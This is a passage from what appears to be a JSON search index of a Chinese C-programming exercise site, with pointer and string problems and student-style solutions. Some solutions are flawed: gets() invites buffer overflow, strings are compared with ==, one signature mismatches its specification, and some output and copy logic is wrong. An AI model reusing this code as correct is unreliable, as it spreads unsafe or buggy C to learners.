\u4e2a\u6570\u5bf9\u6362\uff0c\u5c06\u6700\u5927\u7684\u6570\u4e0e\u6700\u540e\u4e00\u4e2a\u6570\u5bf9\u6362\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\nvoid input(int *number) {\n    int i;\n    for (i = 0; i &lt; 10; i++)\n        scanf(\"%d\", &amp;number[i]);\n}\n\nvoid max_min_value (int *number) {\n    int  *max, *min, *p, temp;\n    max = min = number;\n    for (p = number + 1; p &lt; number + 10; p++)\n        if (*p &gt; *max)\n            max = p;\n        else if (*p &lt; *min)\n            min = p;\n    temp = number[0];\n    number[0] = *min;\n    *min = temp;\n    if (max == number)\n        max = min;\n    temp = number[9];\n    number[9] = *max;\n    *max = temp;\n}\n\nvoid output (int *number) {\n    int *p;\n    for (p = number; p &lt; number + 10; p++)\n        printf(\"%d \", *p);\n    printf(\"\\n\");\n}\n\nint main () {\n    int number[10];\n    input(number);\n    max_min_value(number);\n    output(number);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#43","title":"43","text":"<p>\u4f7f\u7528\u6307\u9488\u5bf9\u5b57\u7b26\u4e32\u8fdb\u884c\u6392\u5e8f</p> <p>\u4f7f\u7528\u6307\u9488\u53d8\u91cf\u5bf9\u8f93\u5165\u7684 3 \u4e2a\u5b57\u7b26\u4e32\u8fdb\u884c\u4ece\u5c0f\u5230\u5927\u6392\u5e8f\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nvoid swap (char *p1, char *p2) {\n    char p[20];\n    strcpy(p, p1);\n    strcpy(p1, p2);\n    strcpy(p2, p);\n}\n\nint main () {\n    char str1[20], str2[20], str3[30];\n    gets(str1);\n    gets(str2);\n    gets(str3);\n    if (strcmp(str1, str2) &gt; 0)\n        swap(str1, str2);\n    if (strcmp(str1, str3) &gt; 0)\n        swap(str1, str3);\n    if (strcmp(str2, str3) &gt; 0)\n        swap(str2, str3);\n    printf(\"%s\\n%s\\n%s\\n\", str1, str2, str3);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#44","title":"44","text":"<p>\u8f93\u51fa\u5730\u5740</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a \u9884\u7f6e\u4ee3\u7801\u4e2d\u5b9a\u4e49\u4e86\u4e24\u4e2a\u53d8\u91cf\uff0c\u8bf7\u4ee5\u5341\u516d\u8fdb\u5236\u5f62\u5f0f\u8f93\u51fa\u5b83\u4eec\u7684\u5730\u5740\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\nint main () {\n    int a = 100;\n    char str[20] = \"alphacoding.cn\";\n    printf(\"%#X %#X\", &amp;a, str);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#45","title":"45","text":"<p>\u6839\u636e\u7ed3\u675f\u65f6\u95f4\u548c\u7528\u65f6, \u63a8\u7b97\u5f00\u59cb\u65f6\u95f4.</p> <p>\u6ce8\u610f: \u672c\u9898\u91c7\u7528 24 \u5c0f\u65f6\u5236\u3002\u5373\u65f6\u95f4\u8303\u56f4\u5728<code>0:00:00.00 ~ 23:59:59.99</code>\u4e4b\u95f4\u3002</p> <p>\u51fd\u6570\u5b9a\u4e49</p> Text Only<pre><code>void time_sub (int *start_hour, int *start_minute, double *start_second, int end_hour, int end_minute, double end_second, double duration);\n</code></pre> <p>\u53c2\u6570\u8bf4\u660e</p> <ul> <li><code>start_hour</code>, \u6574\u578b\u6307\u9488, \u8868\u793a\u5f00\u59cb\u65f6\u95f4\u7684\u5c0f\u65f6</li> <li><code>start_minute</code>, \u6574\u578b\u6307\u9488, \u8868\u793a\u5f00\u59cb\u65f6\u95f4\u7684\u5206\u949f</li> <li><code>start_second</code>, \u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570\u6307\u9488, \u8868\u793a\u5f00\u59cb\u65f6\u95f4\u7684\u79d2\u6570</li> <li><code>end_hour</code>, \u6574\u578b, \u8868\u793a\u7ed3\u675f\u65f6\u95f4\u7684\u5c0f\u65f6</li> <li><code>end_minute</code>, \u6574\u578b, \u8868\u793a\u7ed3\u675f\u65f6\u95f4\u7684\u5206\u949f</li> <li><code>end_second</code>, \u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570, \u8868\u793a\u7ed3\u675f\u65f6\u95f4\u7684\u79d2\u6570</li> <li><code>duration</code>, \u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570, \u8868\u793a\u7528\u65f6\u79d2\u6570, \u5176\u503c\u5728<code>0.00 ~ 86400.00</code>\u4e4b\u95f4</li> </ul> <p>\u793a\u4f8b1</p> <p>\u53c2\u6570</p> Text Only<pre><code>end_hour = 8\nend_minute = 26\nend_second = 0.2\nduration = 15.2\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>start_hour: 8\nstart_minute: 25\nstart_second: 45.00\n</code></pre> <p>\u793a\u4f8b2</p> <p>\u53c2\u6570</p> Text Only<pre><code>end_hour = 0\nend_minute = 0\nend_second = 0.4\nduration = 0.53\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>start_hour: 23\nstart_minute: 59\nstart_second: 59.87\n</code></pre> C<pre><code>#include &lt;stdio.h&gt;\n\nvoid time_sub (int *start_hour, int *start_minute, double *start_second, int end_hour, int end_minute, double end_second, double duration) {\n    // TODO \u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\uff0c\u5b8c\u6210\u9898\u76ee\u8981\u6c42\n    double start_time, end_time;\n    end_time = end_hour * 60 * 60 + end_minute * 60 + end_second;\n    start_time = end_time - duration;\n    if (start_time &lt; 0) {\n        start_time = 24 * 60 * 60 + start_time;\n    }\n    *start_hour = (int)start_time / 3600;\n    *start_minute = (int)start_time % 3600 / 60;\n    *start_second = start_time - *start_hour * 3600 - *start_minute * 60;\n}\n\nint main () {\n    int start_hour, start_minute, end_hour = 8, end_minute = 26;\n    double start_second, end_second = 0.2, duration = 15.2;\n    time_sub(&amp;start_hour, &amp;start_minute, &amp;start_second, end_hour, end_minute, end_second, duration);\n    printf(\"start_hour: %d\\nstart_minute: %d\\nstart_second: %.2f\\n\", start_hour, start_minute, start_second);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#46","title":"46","text":"<p>\u7edf\u8ba1\u4e00\u4e2a\u957f\u5ea6\u4e3a 3 \u7684\u5b57\u7b26\u4e32\u5728\u53e6\u4e00\u4e2a\u5b57\u7b26\u4e32\u4e2d\u51fa\u73b0\u7684\u6b21\u6570. \u5982, \u5b57\u7b26\u4e32\"asd\"\u5728\u5b57\u7b26\u4e32\"asdasasdfgasdaszx67asdmklo\"\u4e2d\u51fa\u73b0 4 \u6b21.</p> <p>\u51fd\u6570\u5b9a\u4e49</p> Text Only<pre><code>int count_substr (char *str, char *substr);\n</code></pre> <p>\u53c2\u6570\u8bf4\u660e</p> <ul> <li><code>str</code>, \u5b57\u7b26\u4e32\u6307\u9488, \u8868\u793a\u5f85\u67e5\u627e\u7684\u5b57\u7b26\u4e32</li> <li><code>substr</code>, \u5b57\u7b26\u4e32\u6307\u9488, \u8868\u793a\u5f85\u7edf\u8ba1\u7684\u5b57\u7b26\u4e32</li> </ul> <p>\u8fd4\u56de\u503c\u8bf4\u660e</p> <p>\u51fd\u6570\u8fd4\u56de<code>substr</code>\u5728<code>str</code>\u4e2d\u51fa\u73b0\u7684\u6b21\u6570; \u5176\u7c7b\u578b\u4e3a int.</p> C<pre><code>#include &lt;stdio.h&gt;\n\n// \u51fd\u6570\u7528\u4e8e\u7edf\u8ba1\u5b50\u5b57\u7b26\u4e32\u5728\u4e3b\u5b57\u7b26\u4e32\u4e2d\u7684\u51fa\u73b0\u6b21\u6570\nint count_substr(char *str, char *substr) {\n    int count = 0;\n    while (*str) {\n        // \u5224\u65ad\u5f53\u524d\u4f4d\u7f6e\u5f00\u59cb\u7684\u4e09\u4e2a\u5b57\u7b26\u662f\u5426\u4e0e\u5b50\u5b57\u7b26\u4e32\u76f8\u540c\n        if (*str == substr[0] &amp;&amp; *(str + 1) == substr[1] &amp;&amp; *(str + 2) == substr[2]) {\n            count++; // \u76f8\u540c\u5219\u589e\u52a0\u8ba1\u6570\n        }\n        str++; // \u79fb\u52a8\u5230\u4e3b\u5b57\u7b26\u4e32\u7684\u4e0b\u4e00\u4e2a\u4f4d\u7f6e\n    }\n    return count; // \u8fd4\u56de\u7edf\u8ba1\u7ed3\u679c\n}\n\nint main() {\n    char str[100];  // \u5047\u8bbe\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u957f\u5ea6\u4e0d\u8d85\u8fc7 99\n    char substr[4]; // \u5047\u8bbe\u8f93\u5165\u7684\u5b50\u5b57\u7b26\u4e32\u957f\u5ea6\u4e3a 3\uff0c\u518d\u52a0\u4e0a\u5b57\u7b26\u4e32\u7ed3\u5c3e\u7684\u7a7a\u5b57\u7b26 '\\0'\n\n    fgets(str, sizeof(str), stdin); // \u4ece\u6807\u51c6\u8f93\u5165\u83b7\u53d6\u4e3b\u5b57\u7b26\u4e32\n\n    fgets(substr, sizeof(substr), stdin); // \u4ece\u6807\u51c6\u8f93\u5165\u83b7\u53d6\u8981\u7edf\u8ba1\u7684\u5b50\u5b57\u7b26\u4e32\n\n    int result = count_substr(str, substr); // \u8c03\u7528\u7edf\u8ba1\u51fd\u6570\n\n    printf(\"%d\", result);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#47","title":"47","text":"<p>\u627e\u51fa\u6709<code>n</code>\u4e2a\u5143\u7d20\u7684\u6307\u9488\u6570\u7ec4\u4e2d\u6700\u957f\u7684\u5b57\u7b26\u4e32\u7684\u957f\u5ea6, \u5e76\u5c06\u5176\u8fd4\u56de.</p> <p>\u51fd\u6570\u5b9a\u4e49</p> Text Only<pre><code>int max_len (int n, char *str[]);\n</code></pre> <p>\u53c2\u6570\u8bf4\u660e</p> <ul> <li><code>n</code>, \u6574\u578b, \u8868\u793a\u6570\u7ec4\u957f\u5ea6</li> <li><code>str</code>, \u5b57\u7b26\u4e32\u6307\u9488, \u8868\u793a\u6307\u9488\u6570\u7ec4</li> </ul> <p>\u8fd4\u56de\u503c\u8bf4\u660e</p> <p>\u51fd\u6570\u8fd4\u56de\u6700\u957f\u7684\u5b57\u7b26\u4e32\u957f\u5ea6; \u5176\u7c7b\u578b\u4e3a int.</p> <p>\u793a\u4f8b 1</p> <p>\u53c2\u6570</p> Text Only<pre><code>n = 4\nstr = {\"blue\", \"yellow\", \"red\", \"green\"}\n</code></pre> <p>\u8fd4\u56de</p> Text Only<pre><code>6\n</code></pre> C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint max_len (char *str[], int n) {\n    // TODO \u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\uff0c\u5b8c\u6210\u9898\u76ee\u8981\u6c42\n    int max_len = strlen(str[0]);\n    for (int i = 0; i &lt; n; i++) {\n        int len = strlen(str[i]);\n        if (len &gt; max_len) {\n            max_len = len;\n        } \n    }\n    return max_len;\n}\n\nint main () {\n    int n = 4, ret;\n    char *str[] = {\"blue\", \"yellow\", \"red\", \"green\"};\n    ret = max_len(str, n);\n    printf(\"%d\\n\", ret);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#48","title":"48","text":"<p>**\u67e5\u627e\u661f\u671f  **</p> <p>\u8bbe\u6bcf\u4e2a\u661f\u671f\u90fd\u6709\u4e00\u4e2a\u5bf9\u5e94\u7684\u5e8f\u53f7\uff0c\u5176\u5e8f\u53f7\u548c\u661f\u671f\u7684\u5bf9\u7167\u8868\u5982\u4e0b\uff1a</p> \u5e8f\u53f7 \u661f\u671f 0 Sunday 1 Monday 2 Tuesday 3 Wednesday 4 Thursday 5 Friday 6 Saturday <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a \u8bf7\u5b8c\u5584\u51fd\u6570<code>getindex</code>\u3002<code>getindex</code>\u51fd\u6570\u7684\u529f\u80fd\u662f\u5224\u65ad\u6307\u5b9a\u7684\u5b57\u7b26\u4e32\u662f\u5426\u662f\u661f\u671f\uff0c\u5982\u679c\u662f\uff0c\u5219\u8fd4\u56de\u5176\u5bf9\u5e94\u7684\u5e8f\u53f7\uff1b\u5982\u679c\u4e0d\u662f\uff0c\u5219\u8fd4\u56de<code>-1</code>\u3002</p> <p>\u6ce8\u610f\uff1a\u8bf7\u4e0d\u8981\u4fee\u6539 main \u51fd\u6570\u4e2d\u7684\u4ee3\u7801\u3002</p> <p>\u53c2\u6570\u8bf4\u660e</p> <ul> <li><code>str</code>, \u5b57\u7b26\u4e32\u6307\u9488, \u8868\u793a\u9700\u8981\u5224\u65ad\u7684\u5b57\u7b26\u4e32\u3002</li> </ul> <p>\u793a\u4f8b 1</p> <p>\u53c2\u6570</p> Text Only<pre><code>*str = \"Tuesday\"\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>2\n</code></pre> C<pre><code>#include &lt;stdio.h&gt;\n\nint getindex (char *str) {\n    if (str == \"Sunday\") return 0;\n    else if (str == \"Monday\") return 1;\n    else if (str == \"Tuesday\") return 2;\n    else if (str == \"Wednesday\") return 3;\n    else if (str == \"Thursday\") return 4;\n    else if (str == \"Friday\") return 5;\n    else if (str == \"Saturday\") return 6;\n    else return -1;\n}\n\nint main () {\n    int n;\n    char *str = \"Tuesday\";\n    n = getindex(str);\n    printf(\"%d\\n\", n);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#49","title":"49","text":"<p>\u8ba1\u7b97\u4e24\u6570\u7684\u548c\u4e0e\u5dee</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a \u8bf7\u5b8c\u5584\u51fd\u6570<code>sum_diff</code>\u3002<code>sum_diff</code>\u51fd\u6570\u7684\u529f\u80fd\u662f\u8ba1\u7b97\u4e24\u4e2a\u5b9e\u6570<code>op1</code>\u548c<code>op2</code>\u7684\u548c<code>*psum</code>\u4e0e\u5dee<code>*pdiff</code>\uff08op1 - op2 \u7684\u503c\uff09\u3002</p> <p>\u6ce8\u610f\uff1a\u8bf7\u4e0d\u8981\u4fee\u6539 main \u51fd\u6570\u4e2d\u7684\u4ee3\u7801\u3002</p> <p>\u53c2\u6570\u8bf4\u660e</p> <ul> <li><code>op1</code>, \u6d6e\u70b9\u6570, \u8868\u793a\u5f85\u64cd\u4f5c\u6570\u4e00\u3002</li> <li><code>op2</code>, \u6d6e\u70b9\u6570, \u8868\u793a\u5f85\u64cd\u4f5c\u6570\u4e8c\u3002</li> <li><code>psum</code>, \u6d6e\u70b9\u6570\u6307\u9488, \u8868\u793a\u5b58\u50a8\u4e24\u6570\u548c\u7684\u6307\u9488\u3002</li> <li><code>pdiff</code>, \u6d6e\u70b9\u6570\u6307\u9488, \u8868\u793a\u5b58\u50a8\u4e24\u6570\u5dee\u7684\u6307\u9488\u3002</li> </ul> C<pre><code>#include &lt;stdio.h&gt;\n\nvoid sum_diff (float op1, float op2, float *psum, float *pdiff) {\n    // TODO \u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\uff0c\u5b8c\u6210\u9898\u76ee\u8981\u6c42\n    *psum = op1 + op2;\n    *pdiff = op1 - op2;\n}\n\nint main () {\n    float op1 = 4, op2 = 6, psum, pdiff;\n    sum_diff (op1, op2, &amp;psum, &amp;pdiff);\n    printf(\"sum: %f\\ndiff: %f\", psum, pdiff);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#50","title":"50","text":"<p>\u5229\u7528\u6307\u9488\u627e\u6700\u5927\u503c</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a \u8bf7\u5b8c\u5584\u51fd\u6570<code>find_max</code>\u3002<code>find_max</code>\u51fd\u6570\u7684\u529f\u80fd\u662f\u627e\u51fa\u4e24\u4e2a\u6307\u9488\u6240\u6307\u5411\u7684\u6574\u6570\u4e2d\u7684\u6700\u5927\u503c\uff0c\u5e76\u5c06\u5176\u4fdd\u5b58\u5728\u4e00\u4e2a\u6307\u9488\u4e2d\u3002</p> <p>\u6ce8\u610f\uff1a\u8bf7\u4e0d\u8981\u4fee\u6539 main \u51fd\u6570\u4e2d\u7684\u4ee3\u7801\u3002</p> <p>**\u53c2\u6570\u8bf4\u660e  **</p> <ul> <li><code>px</code>,\u6574\u6570\u6307\u9488\uff0c\u8868\u793a\u6574\u6570\u4e00\u3002</li> <li><code>py</code>,\u6574\u6570\u6307\u9488\uff0c\u8868\u793a\u6574\u6570\u4e8c\u3002</li> <li><code>pmax</code>\uff0c\u6574\u6570\u6307\u9488\uff0c\u8868\u793a\u9700\u8981\u4fdd\u5b58\u7684\u6307\u9488\u3002</li> </ul> C<pre><code>#include &lt;stdio.h&gt;\n\nvoid find_max (int *px, int *py, int *pmax) {\n    // \u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\uff0c\u5b8c\u6210\u9898\u76ee\u8981\u6c42\n    if (*px &gt; *py) {\n        *pmax = *px;\n    } else {\n        *pmax = *py;\n    }\n}\n\nint main () {\n    int x = 11, y = 22, max;\n    find_max (&amp;x, &amp;y, &amp;max);\n    printf(\"%d\\n\", max);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#51","title":"51","text":"<p>\u67e5\u627e\u5b50\u4e32</p> <p>\u5728\u5b57\u7b26\u4e32\u4e2d\u67e5\u627e\u5b50\u4e32, \u5982\u679c\u80fd\u627e\u5230, \u8fd4\u56de\u5b50\u4e32\u9996\u5b57\u7b26\u5728\u6bcd\u4e32\u4e2d\u7684\u4f4d\u7f6e(\u8be5\u4f4d\u7f6e\u4ece 0 \u5f00\u59cb); \u82e5\u6ca1\u6709\u627e\u5230\u5b50\u4e32, \u8fd4\u56de -1\u3002</p> <p>\u51fd\u6570\u5b9a\u4e49</p> Text Only<pre><code>int search (char *str, char *substr);\n</code></pre> <p>\u53c2\u6570\u8bf4\u660e</p> <ul> <li><code>str</code>, \u5b57\u7b26\u4e32\u6307\u9488, \u8868\u793a\u5f85\u67e5\u627e\u7684\u5b57\u7b26\u4e32</li> <li><code>substr</code>, \u5b57\u7b26\u4e32\u6307\u9488, \u8868\u793a\u5b50\u4e32</li> </ul> <p>\u8fd4\u56de\u503c\u8bf4\u660e</p> <p>\u51fd\u6570\u8fd4\u56de\u5b50\u4e32\u9996\u5b57\u7b26\u5728\u6bcd\u4e32\u4e2d\u7684\u4f4d\u7f6e; \u5176\u7c7b\u578b\u4e3a<code>int</code>.</p> <p>\u793a\u4f8b 1</p> <p>\u53c2\u6570</p> Text Only<pre><code>str = \"abcdefghijklmn\"\nsubstr = \"def\"\n</code></pre> <p>\u8fd4\u56de</p> Text Only<pre><code>3\n</code></pre> C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nchar temp_str[30];\n\nvoid read_str_unit (char *str, char *temp_str, int idx, int len) {\n    int index = 0;\n    for (index = 0; index &lt; len; index++) {\n        temp_str[index] = str[idx+index];\n    }\n    temp_str[index] = '\\0';\n}\n\nint search (char *str, char *substr) {\n    // TODO \u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\uff0c\u5b8c\u6210\u9898\u76ee\u8981\u6c42\n    int idx = 0;\n    int len1 = strlen(str);\n    int len2 = strlen(substr);\n    if (len1 &lt; len2) {\n        printf(\"error\\n\");\n        return -1;\n    }\n    while (1) {\n        read_str_unit(str, temp_str, idx, len2);\n        if (strcmp(substr, temp_str) == 0) break;\n        idx++;\n        if (idx &gt;= len1) return -1;\n    }\n    return idx;\n}\n\nint main () {\n    char *str = \"abcdefghijklmn\", *substr = \"def\";\n    int i = 0;\n    i = search(str, substr);\n    printf(\"%d\\n\", i);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#52","title":"52","text":"<p>\u62c6\u5206\u5b9e\u6570\u7684\u6574\u6570\u4e0e\u5c0f\u6570\u90e8\u5206</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a \u8bf7\u5b8c\u5584\u51fd\u6570<code>splitfloat</code>\u3002<code>splitfloat</code>\u51fd\u6570\u7684\u529f\u80fd\u662f\u62c6\u5206\u4e00\u4e2a\u7ed9\u5b9a\u5b9e\u6570<code>number</code>\u7684\u6574\u6570\u4e0e\u5c0f\u6570\u90e8\u5206\uff0c\u5e76\u5c06\u5b83\u4eec\u5b58\u50a8\u5230\u6307\u9488\u53d8\u91cf\u4e2d\u3002</p> <p>\u6ce8\u610f\uff1a\u8bf7\u4e0d\u8981\u4fee\u6539 main \u51fd\u6570\u4e2d\u7684\u4ee3\u7801\u3002</p> <p>\u53c2\u6570\u8bf4\u660e</p> <ul> <li><code>number</code>\uff0c\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u578b\uff0c\u8868\u793a\u9700\u8981\u62c6\u5206\u7684\u6574\u6570\u3002</li> <li><code>intpart</code>\uff0c\u6574\u578b\uff0c\u8868\u793a\u62c6\u5206\u51fa\u6765\u7684\u6574\u6570\u90e8\u5206\u3002</li> <li><code>fracpart</code>\uff0c\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u578b\uff0c\u8868\u793a\u62c6\u5206\u51fa\u6765\u7684\u5c0f\u6570\u90e8\u5206\u3002</li> </ul> C<pre><code>#include &lt;stdio.h&gt;\n\nvoid splitfloat (double number, int *intpart, double *fracpart) {\n    *intpart = (int)number;\n    *fracpart = number - *intpart;\n}\n\nint main () {\n    double number = 123.456;\n    int intpart;\n    double fracpart;\n    splitfloat (number, &amp;intpart, &amp;fracpart);\n    printf(\"intpart: %d\\nfracpart: %g\", intpart, fracpart);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#53","title":"53","text":"<p>\u79fb\u52a8\u5b57\u6bcd</p> <p>\u5c06\u6307\u5b9a\u5b57\u7b26\u4e32\u7684\u524d\u4e09\u4e2a\u5b57\u7b26\u79fb\u5230\u6700\u540e.</p> <p>\u51fd\u6570\u5b9a\u4e49</p> Text Only<pre><code>void shift (char *str);\n</code></pre> <p>\u53c2\u6570\u8bf4\u660e</p> <ul> <li><code>str</code>, \u5b57\u7b26\u4e32\u6307\u9488, \u8868\u793a\u9700\u8981\u8fdb\u884c\u79fb\u52a8\u7684\u5b57\u7b26\u4e32</li> </ul> C<pre><code>#include &lt;stdio.h&gt;\n\nvoid shift (char *str) {\n    // TODO \u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\uff0c\u5b8c\u6210\u9898\u76ee\u8981\u6c42\n    char string[3];\n    int i, j;\n    for (i = 0; i &lt; 3; i++)\n        string[i] = str[i];\n    for (i = 3; str[i] != '\\0'; i++)\n        str[i-3] = str[i];\n    for (j = i - 3, i = 0; i &lt; 3; i++)\n        str[j++] = string[i];\n}\n\nint main () {\n    char str[100] = \"I am a student. I like programming.\";\n    shift(str);\n    printf(\"%s\", str);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#54","title":"54","text":"<p>\u5b57\u7b26\u4e32\u90e8\u5206\u590d\u5236</p> <p>\u5c06\u4f20\u5165\u7684\u5b57\u7b26\u4e32<code>str1</code>\u4e2d\u4ece\u7b2c<code>index</code>\u4e2a\u5b57\u7b26\u5f00\u59cb\u7684\u5168\u90e8\u5b57\u7b26\u590d\u5236\u5230\u5b57\u7b26\u4e32<code>str2</code>\u4e2d\u3002</p> <p>\u6ce8\u610f: index \u5fc5\u987b\u5c0f\u4e8e \u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u3002\u590d\u5236\u65f6, \u5305\u542b\u7b2c<code>index</code>\u4e2a\u5b57\u7b26.</p> <p>\u51fd\u6570\u5b9a\u4e49</p> Text Only<pre><code>void strmcpy (char *str1, int index, char *str2);\n</code></pre> <p>\u53c2\u6570\u8bf4\u660e</p> <ul> <li><code>str1</code>, \u5b57\u7b26\u4e32\u6307\u9488, \u8868\u793a\u88ab\u590d\u5236\u7684\u5b57\u7b26\u4e32</li> <li><code>index</code>, \u6574\u578b, \u8868\u793a\u6307\u5b9a\u7684\u4f4d\u7f6e</li> <li><code>str2</code>, \u5b57\u7b26\u4e32\u6307\u9488, \u8868\u793a\u5b8c\u6210\u590d\u5236\u7684\u5b57\u7b26\u4e32</li> </ul> C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nvoid strmcpy (char *str1, int index, char *str2) {\n    // TODO \u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\uff0c\u5b8c\u6210\u9898\u76ee\u8981\u6c42\n    int i, j, len;\n    strcpy(str2, str1);\n    len = strlen(str2);\n    for(i = index - 1; i &gt; 0; i--){\n        for(j = i; j &lt; len; j++){\n            *(str2 + j - 1) = *(str2 + j);\n        }\n    }\n    *(str2 + len - index + 1)='\\0';\n}\n\nint main () {\n    char str1[100] = \"I am a student. I like programming.\", str2[100];\n    int index = 10;\n    strmcpy(str1, index, str2);\n    printf(\"%s\", str2);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#55","title":"55","text":"<p>\u6708\u4efd\u82f1\u6587\u540d</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a \u8bf7\u5b8c\u5584\u51fd\u6570<code>*getmonth</code>\u3002<code>*getmonth</code>\u51fd\u6570\u7684\u529f\u80fd\u662f\u8fd4\u56de\u6708\u4efd<code>month</code>\u7684\u82f1\u6587\u540d\u79f0\u3002\u5982\u679c\u4f20\u5165\u7684\u53c2\u6570<code>month</code>\u4e0d\u662f\u4e00\u4e2a\u4ee3\u8868\u6708\u4efd\u7684\u6570\u5b57\uff0c\u5219\u8fd4\u56de<code>NULL</code>\u3002</p> <p>\u6ce8\u610f\uff1a\u8bf7\u4e0d\u8981\u4fee\u6539 main \u51fd\u6570\u4e2d\u7684\u4ee3\u7801\u3002\u4ece\u4e00\u6708\u5230\u5341\u4e8c\u6708\u7684\u82f1\u6587\u540d\u5206\u522b\u662f<code>January</code>,<code>February</code>,<code>March</code>,<code>April</code>,<code>May</code>,<code>June</code>,<code>July</code>,<code>August</code>,<code>September</code>,<code>October</code>,<code>November</code>,<code>December</code></p> <p>\u53c2\u6570\u8bf4\u660e</p> <ul> <li><code>month</code>\uff0c\u6574\u578b\uff0c\u8868\u793a\u4f20\u5165\u7684\u6708\u4efd\uff0c\u5176\u503c\u4e3a<code>1 ~ 12</code>\u7684\u6574\u6570\u3002</li> </ul> C<pre><code>#include &lt;stdio.h&gt;\n\nchar *getmonth (int month) {\n    switch (month) {\n        case 1:\n            return \"January\";\n        case 2:\n            return \"February\";\n        case 3:\n            return \"March\";\n        case 4:\n            return \"April\";\n        case 5:\n            return \"May\";\n        case 6:\n            return \"June\";\n        case 7:\n            return \"July\";\n        case 8:\n            return \"August\";\n        case 9:\n            return \"September\";\n        case 10:\n            return \"October\";\n        case 11:\n            return \"November\";\n        case 12:\n            return \"December\";\n        default:\n            return NULL;\n    }\n    return NULL;\n}\n\nint main () {\n    char *month_name;\n    int month = 5;\n    month_name = getmonth (month);\n    printf(\"%s\", month_name);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#56","title":"56","text":"<p>\u5b57\u7b26\u6392\u961f</p> <p>\u5c06\u7ed9\u5b9a\u5b57\u7b26\u4e32\u4e2d\u7684\u5b57\u7b26\uff0c\u6309\u7167 ASCII \u7801\u987a\u5e8f\u4ece\u5c0f\u5230\u5927\u6392\u5e8f\u540e\u8f93\u51fa\u3002</p> <p>\u8f93\u5165\u683c\u5f0f</p> <p>\u8f93\u5165\u662f\u4e00\u4e2a\u4ee5\u56de\u8f66\u7ed3\u675f\u7684\u975e\u7a7a\u5b57\u7b26\u4e32\uff08\u5c11\u4e8e80\u4e2a\u5b57\u7b26\uff09\u3002</p> <p>\u6ce8\uff1a\u4e0d\u80fd\u4f7f\u7528\u5185\u7f6e\u51fd\u6570\u6392\u5e8f</p> <p>\u8f93\u51fa\u683c\u5f0f</p> <p>\u8f93\u51fa\u6392\u5e8f\u540e\u7684\u7ed3\u679c\u5b57\u7b26\u4e32\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n\n    char s[200] = {};\n    scanf(\"%s\", s);\n\n    // \u6c42\u957f\u5ea6\n    int len = 0;\n    char *p = s;\n    while(*(p++)) len++;\n\n    for (int i=0; i&lt;len; i++) {\n        for (int j=1; j&lt;len - i; j++) {\n            if (s[j] &lt; s[j-1]) {\n                char c = s[j];\n                s[j] = s[j-1];\n                s[j-1] = c;\n            }\n        }\n    }\n\n    printf(\"%s\\n%d\", s, len);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#57","title":"57","text":"<p>\u63d0\u53d6\u5b57\u7b26\u4e32\u4e2d\u7684\u6570\u5b57\u7ec4\u6210\u6574\u6570</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a \u5c06\u4e00\u4e2a\u5b57\u7b26\u4e32\u4e2d\u7684\u6240\u6709\u6570\u5b57\u5b57\u7b26(\u20180\u2019\u2026\u20189\u2019)\u63d0\u53d6\u51fa\u6765, \u5c06\u5176\u8f6c\u6362\u4e3a\u4e00\u4e2a\u6574\u6570, \u5e76\u5c06\u8f6c\u6362\u540e\u7684\u6574\u6570\u8f93\u51fa.</p> 